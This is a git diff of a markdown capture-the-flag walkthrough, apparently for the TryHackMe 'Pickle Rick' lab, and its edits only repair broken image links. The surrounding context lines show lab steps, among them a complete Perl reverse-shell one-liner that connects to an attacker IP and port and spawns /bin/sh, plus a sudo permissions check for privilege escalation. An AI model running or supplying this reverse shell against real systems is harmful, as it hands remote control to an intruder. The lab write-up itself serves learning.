@@ -65,7 +65,7 @@ That is a good clue. Let's look around the system
 ls home
 ```
 
-![ls-home](/assets/images/thm/pickle-rick/ls-home.png
+![ls-home](/assets/images/thm/pickle-rick/ls-home.png)
 
 This rick directory looks suspicious
 
@@ -73,7 +73,7 @@ This rick directory looks suspicious
 ls /home/rick
 ```
 
-![ls-rick](/assets/images/thm/pickle-rick/ls-rick.png
+![ls-rick](/assets/images/thm/pickle-rick/ls-rick.png)
 
 Here we go, we have found the second ingredient. Just read it
 
@@ -87,7 +87,7 @@ Now we need to find the last third ingredient. I tried to execute a revesre shel
 perl -e 'use Socket;$i="10.10.198.228";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-![shell](/assets/images/thm/pickle-rick/shell.png
+![shell](/assets/images/thm/pickle-rick/shell.png)
 
 We have a shell acces now we have to escalate our privileges. One of the first thing that you can check is whether our user has any sudo permissions
 
@@ -95,7 +95,7 @@ We have a shell acces now we have to escalate our privileges. One of the first t
 sudo -l
 ```
 
-![sudo-l](/assets/images/thm/pickle-rick/sudo-l.png
+![sudo-l](/assets/images/thm/pickle-rick/sudo-l.png)
 
 Wow we have the right to execute any commands with as root without password
 
